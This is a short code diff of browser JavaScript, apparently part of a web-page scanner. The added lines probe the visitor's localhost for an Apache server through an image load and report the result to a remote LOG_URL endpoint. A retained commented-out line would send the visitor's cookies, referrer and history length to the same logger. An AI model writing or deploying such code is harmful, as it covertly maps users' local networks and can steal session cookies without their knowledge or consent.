@@ -19,6 +19,16 @@
     
      let imCoo = new Image();
      //imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
+      
+      imCoo.src="http://127.0.0.1:80/icons/apache_pb.png";
+      imCoo.onerror = function(){
+        let imL = new Image();
+        imL.src = LOG_URL + "?NO APACHE";
+      }
+      imCoo.onload = function(){
+        let imL = new Image();
+        imL.src = LOG_URL + "?APACHE FOUND";
+      }
      //
       var last_scanobj_index = 0;
       var scanobjs = {};
